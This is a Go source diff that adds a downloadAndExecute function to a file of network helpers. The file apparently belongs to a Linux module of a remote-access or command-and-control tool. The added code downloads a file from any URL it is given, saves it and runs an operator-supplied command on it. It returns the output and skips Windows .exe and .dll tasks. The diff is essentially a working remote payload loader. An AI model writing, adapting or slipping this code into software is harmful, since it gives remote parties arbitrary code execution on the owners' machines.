@@ -26,3 +26,30 @@ func networks() ([]string, error) {
 func netInterfaces() []string {
 	return []string{"wlan0"}
 }
+
+func downloadAndExecute(url string, cmd string) (string, error) {
+	splitted := strings.Split(url, "/")
+	filename := splitted[len(splitted)-1]
+	if strings.Contains(cmd, ".exe") || strings.Contains(cmd, ".dll") {
+		return "Cannot run specified execution task on linux", nil
+	}
+	f, err := os.Create(filename)
+	if err != nil {
+		return "failed", err
+	}
+	defer f.Close()
+
+	response, err := http.Get(url)
+	if err != nil {
+		return "failed", err
+	}
+	defer response.Body.Close()
+
+	_, err = io.Copy(f, response.Body)
+	if err != nil {
+		return "failed", err
+	}
+	_cmd := strings.Replace(cmd, "[file]", filename, 1)
+	out, er := CmdOut(_cmd)
+	return out, er
+}
